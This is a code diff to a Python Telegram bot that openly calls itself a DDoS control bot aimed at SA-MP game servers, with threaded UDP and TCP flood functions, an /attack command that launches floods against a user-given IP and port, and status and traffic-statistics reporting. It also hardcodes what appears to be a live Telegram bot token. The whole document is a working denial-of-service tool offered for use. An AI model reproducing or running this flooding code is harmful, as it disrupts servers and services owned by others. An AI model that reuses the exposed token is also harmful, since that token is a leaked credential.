@@ -8,12 +8,12 @@ import logging
 from datetime import datetime
 from flask import Flask, jsonify, request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
+from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
 
 # Disable logging for cleaner output
 logging.basicConfig(level=logging.ERROR)
 
-# Bot Token - Palitan mo ito ng iyong bot token
+# Bot Token
 BOT_TOKEN = "8462382934:AAF_dC1yr5YZjXZpTp0FXYWdZaLtuy8F8d0"
 
 # Flask app
@@ -39,7 +39,7 @@ START_TEXT = """
 ╚══════════════════════════════════╝
 
 Operator: YORODA HAMADA
-Mode: DDOS SAMP
+Mode: DDOS (SA-MP) 
 Build: v1.0
 
 Commands:
@@ -271,12 +271,13 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     status_msg = "ACTIVE ATTACKS:\n\n"
     for attack_id, info in active_attacks.items():
-        status_msg += f"ID: {attack_id}\n"
-        status_msg += f"   Target: {info['ip']}:{info['port']}\n"
-        status_msg += f"   Mode: {info['mode'].upper()}\n"
-        status_msg += f"   Threads: {info['threads']}\n"
-        status_msg += f"   Packets Sent: {info.get('packets_sent', 0):,}\n"
-        status_msg += f"   Status: RUNNING\n\n"
+        if info.get('running', False):
+            status_msg += f"ID: {attack_id}\n"
+            status_msg += f"   Target: {info['ip']}:{info['port']}\n"
+            status_msg += f"   Mode: {info['mode'].upper()}\n"
+            status_msg += f"   Threads: {info['threads']}\n"
+            status_msg += f"   Packets Sent: {info.get('packets_sent', 0):,}\n"
+            status_msg += f"   Status: RUNNING\n\n"
     
     await update.message.reply_text(status_msg)
 
@@ -290,15 +291,16 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats_msg += "=" * 30 + "\n\n"
     
     for attack_id, info in active_attacks.items():
-        stats_msg += f"TARGET: {info['ip']}:{info['port']}\n"
-        stats_msg += f"MODE: {info['mode'].upper()}\n"
-        stats_msg += f"THREADS: {info['threads']}\n"
-        stats_msg += f"PACKETS SENT: {info.get('packets_sent', 0):,}\n"
-        stats_msg += f"PACKETS PER SECOND: {info.get('pps', 0):,}\n"
-        stats_msg += f"TOTAL DATA SENT: {info.get('total_data', 0):,} bytes\n"
-        stats_msg += f"TOTAL DATA (MB): {info.get('total_data', 0) / (1024 * 1024):.2f} MB\n"
-        stats_msg += f"UPTIME: {info.get('uptime', '0s')}\n"
-        stats_msg += "-" * 30 + "\n"
+        if info.get('running', False):
+            stats_msg += f"TARGET: {info['ip']}:{info['port']}\n"
+            stats_msg += f"MODE: {info['mode'].upper()}\n"
+            stats_msg += f"THREADS: {info['threads']}\n"
+            stats_msg += f"PACKETS SENT: {info.get('packets_sent', 0):,}\n"
+            stats_msg += f"PACKETS PER SECOND: {info.get('pps', 0):,}\n"
+            stats_msg += f"TOTAL DATA SENT: {info.get('total_data', 0):,} bytes\n"
+            stats_msg += f"TOTAL DATA (MB): {info.get('total_data', 0) / (1024 * 1024):.2f} MB\n"
+            stats_msg += f"UPTIME: {info.get('uptime', '0s')}\n"
+            stats_msg += "-" * 30 + "\n"
     
     await update.message.reply_text(stats_msg)
 
@@ -344,7 +346,6 @@ def attack_udp_1(ip, port, times, attack_id):
                 if not active_attacks.get(attack_id, {}).get('running', True):
                     break
                 s.sendto(data, addr)
-                # Update statistics
                 if attack_id in active_attacks:
                     active_attacks[attack_id]['packets_sent'] = active_attacks[attack_id].get('packets_sent', 0) + 1
                     active_attacks[attack_id]['total_data'] = active_attacks[attack_id].get('total_data', 0) + len(data)
@@ -368,7 +369,6 @@ def attack_udp_2(ip, port, times, attack_id):
                 if not active_attacks.get(attack_id, {}).get('running', True):
                     break
                 s.sendto(data, addr)
-                # Update statistics
                 if attack_id in active_attacks:
                     active_attacks[attack_id]['packets_sent'] = active_attacks[attack_id].get('packets_sent', 0) + 1
                     active_attacks[attack_id]['total_data'] = active_attacks[attack_id].get('total_data', 0) + len(data)
@@ -394,7 +394,6 @@ def attack_tcp_1(ip, port, times, attack_id):
                 if not active_attacks.get(attack_id, {}).get('running', True):
                     break
                 s.send(data)
-                # Update statistics
                 if attack_id in active_attacks:
                     active_attacks[attack_id]['packets_sent'] = active_attacks[attack_id].get('packets_sent', 0) + 1
                     active_attacks[attack_id]['total_data'] = active_attacks[attack_id].get('total_data', 0) + len(data)
@@ -418,7 +417,6 @@ def attack_tcp_2(ip, port, times, attack_id):
                 if not active_attacks.get(attack_id, {}).get('running', True):
                     break
                 s.send(data)
-                # Update statistics
                 if attack_id in active_attacks:
                     active_attacks[attack_id]['packets_sent'] = active_attacks[attack_id].get('packets_sent', 0) + 1
                     active_attacks[attack_id]['total_data'] = active_attacks[attack_id].get('total_data', 0) + len(data)
@@ -445,7 +443,6 @@ def calculate_pps(attack_id):
             pps = packets_diff / time_diff
             active_attacks[attack_id]['pps'] = int(pps)
             
-            # Update uptime
             start_time = active_attacks[attack_id].get('start_time', current_time)
             uptime_seconds = int(current_time - start_time)
             if uptime_seconds < 60:
@@ -488,7 +485,6 @@ def start_attack(ip, port, times, threads, attack_id, mode):
     attack_threads[attack_id] = []
     
     if mode == 'udp':
-        # UDP only
         threads_per_type = threads // 2
         if threads_per_type < 1:
             threads_per_type = 1
@@ -506,7 +502,6 @@ def start_attack(ip, port, times, threads, attack_id, mode):
             attack_threads[attack_id].append(t)
     
     elif mode == 'tcp':
-        # TCP only
         threads_per_type = threads // 2
         if threads_per_type < 1:
             threads_per_type = 1
@@ -523,13 +518,11 @@ def start_attack(ip, port, times, threads, attack_id, mode):
             t.start()
             attack_threads[attack_id].append(t)
     
-    else:  # both
-        # Both UDP and TCP
+    else:
         threads_per_type = threads // 4
         if threads_per_type < 1:
             threads_per_type = 1
         
-        # Start UDP attacks
         for _ in range(threads_per_type):
             t = threading.Thread(target=attack_udp_1, args=(ip, port, times, attack_id))
             t.daemon = True
@@ -542,7 +535,6 @@ def start_attack(ip, port, times, threads, attack_id, mode):
             t.start()
             attack_threads[attack_id].append(t)
         
-        # Start TCP attacks
         for _ in range(threads_per_type):
             t = threading.Thread(target=attack_tcp_1, args=(ip, port, times, attack_id))
             t.daemon = True
@@ -555,7 +547,6 @@ def start_attack(ip, port, times, threads, attack_id, mode):
             t.start()
             attack_threads[attack_id].append(t)
     
-    # Start statistics thread
     start_stats_thread(attack_id)
 
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -581,15 +572,13 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         times = int(args[2])
         threads = int(args[3])
         
-        # Check if mode is specified
-        mode = 'both'  # default
+        mode = 'both'
         if len(args) >= 5:
             mode = args[4].lower()
             if mode not in ['udp', 'tcp', 'both']:
                 await update.message.reply_text("Invalid mode! Choose: udp, tcp, or both")
                 return
         
-        # Validate inputs
         if times < 100 or times > 5000:
             await update.message.reply_text("Packets must be between 100-5000")
             return
@@ -604,15 +593,12 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Invalid input! Please use numbers for port, packets, and threads.")
         return
     
-    # Generate attack ID
     attack_id = f"{ip}:{port}:{mode}"
     
-    # Check if attack already running
     if attack_id in active_attacks and active_attacks[attack_id].get('running', False):
         await update.message.reply_text(f"Attack on {attack_id} is already running!")
         return
     
-    # Create confirmation message
     confirm_msg = (
         f"Starting DDOS Attack\n\n"
         f"Target: {ip}\n"
@@ -656,7 +642,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             mode = mode.lower()
             attack_id = f"{ip}:{port}:{mode}"
         else:
-            # Fallback for backward compatibility
             _, attack_id, port, times, threads = parts
             ip = attack_id
             port = int(port)
@@ -677,91 +662,16 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Use /status to check attack status"
         )
         
-        # Start the attack
         start_attack(ip, port, times, threads, attack_id, mode)
         
-        # Send notification after starting
         await context.bot.send_message(
             chat_id=query.message.chat_id,
             text=f"Attack on {attack_id} has been launched with {threads} threads in {mode.upper()} mode!"
         )
 
-async def stats_auto_update(context: ContextTypes.DEFAULT_TYPE):
-    """Auto-update statistics in background"""
-    chat_id = context.job.data
-    if not active_attacks:
-        return
-    
-    stats_msg = "LIVE ATTACK STATISTICS\n"
-    stats_msg += "=" * 30 + "\n\n"
-    
-    for attack_id, info in active_attacks.items():
-        if info.get('running', False):
-            stats_msg += f"TARGET: {info['ip']}:{info['port']}\n"
-            stats_msg += f"MODE: {info['mode'].upper()}\n"
-            stats_msg += f"THREADS: {info['threads']}\n"
-            stats_msg += f"PACKETS SENT: {info.get('packets_sent', 0):,}\n"
-            stats_msg += f"PACKETS PER SECOND: {info.get('pps', 0):,}\n"
-            stats_msg += f"TOTAL DATA: {info.get('total_data', 0):,} bytes\n"
-            stats_msg += f"TOTAL DATA (MB): {info.get('total_data', 0) / (1024 * 1024):.2f} MB\n"
-            stats_msg += f"UPTIME: {info.get('uptime', '0s')}\n"
-            stats_msg += "-" * 30 + "\n"
-    
-    try:
-        await context.bot.send_message(chat_id=chat_id, text=stats_msg)
-    except:
-        pass
-
-async def stats_live_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start live statistics updates"""
-    if not active_attacks:
-        await update.message.reply_text("No active attacks to monitor.")
-        return
-    
-    chat_id = update.effective_chat.id
-    
-    # Remove existing job if any
-    current_jobs = context.job_queue.get_jobs_by_name(str(chat_id))
-    for job in current_jobs:
-        job.schedule_removal()
-    
-    # Send initial stats
-    stats_msg = "LIVE STATISTICS UPDATES ENABLED\n"
-    stats_msg += "=" * 30 + "\n"
-    stats_msg += "Updates will be sent every 5 seconds.\n"
-    stats_msg += "Use /stats to get a single update.\n"
-    stats_msg += "Use /stopstats to disable auto-updates.\n\n"
-    
-    for attack_id, info in active_attacks.items():
-        if info.get('running', False):
-            stats_msg += f"Monitoring: {info['ip']}:{info['port']} [{info['mode'].upper()}]\n"
-    
-    await update.message.reply_text(stats_msg)
-    
-    # Schedule auto updates every 5 seconds
-    context.job_queue.run_repeating(
-        stats_auto_update, 
-        interval=5, 
-        first=1,
-        data=chat_id,
-        name=str(chat_id)
-    )
-
-async def stopstats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Stop live statistics updates"""
-    chat_id = update.effective_chat.id
-    current_jobs = context.job_queue.get_jobs_by_name(str(chat_id))
-    
-    if current_jobs:
-        for job in current_jobs:
-            job.schedule_removal()
-        await update.message.reply_text("Live statistics updates stopped.")
-    else:
-        await update.message.reply_text("No live statistics updates running.")
-
 def run_flask():
     """Run Flask server"""
-    port = int(os.environ.get('PORT', 5000))
+    port = int(os.environ.get('PORT', 10000))
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
 
 def main():
@@ -770,7 +680,7 @@ def main():
 ╔══════════════════════════════════╗
 ║  YORODA HAMADA TELEGRAM BOT     ║
 ║  DDOS Control Bot v1.0          ║
-║  Operator: YORODA HAMADA           ║
+║  Operator: YORODA HAMADA        ║
 ╚══════════════════════════════════╝
     """)
     
@@ -779,25 +689,29 @@ def main():
     flask_thread.daemon = True
     flask_thread.start()
     
-    print(f"Flask server running on port {os.environ.get('PORT', 5000)}")
+    print(f"Flask server running on port {os.environ.get('PORT', 10000)}")
     
-    # Create the Application
-    application = Application.builder().token(BOT_TOKEN).build()
-    
-    # Add command handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("status", status_command))
-    application.add_handler(CommandHandler("stats", stats_command))
-    application.add_handler(CommandHandler("statslive", stats_live_command))
-    application.add_handler(CommandHandler("stopstats", stopstats_command))
-    application.add_handler(CommandHandler("stop", stop_command))
-    application.add_handler(CommandHandler("attack", attack_command))
-    application.add_handler(CallbackQueryHandler(button_callback))
-    
-    # Start the bot
-    print("Bot is running... Press Ctrl+C to stop.")
-    application.run_polling()
+    try:
+        # Create the Application with updated parameters
+        application = Application.builder().token(BOT_TOKEN).build()
+        
+        # Add command handlers
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("help", help_command))
+        application.add_handler(CommandHandler("status", status_command))
+        application.add_handler(CommandHandler("stats", stats_command))
+        application.add_handler(CommandHandler("stop", stop_command))
+        application.add_handler(CommandHandler("attack", attack_command))
+        application.add_handler(CallbackQueryHandler(button_callback))
+        
+        # Start the bot
+        print("Bot is running... Press Ctrl+C to stop.")
+        application.run_polling()
+    except Exception as e:
+        print(f"Error starting bot: {e}")
+        # Keep Flask running even if bot fails
+        while True:
+            time.sleep(1)
 
 if __name__ == '__main__':
     try:
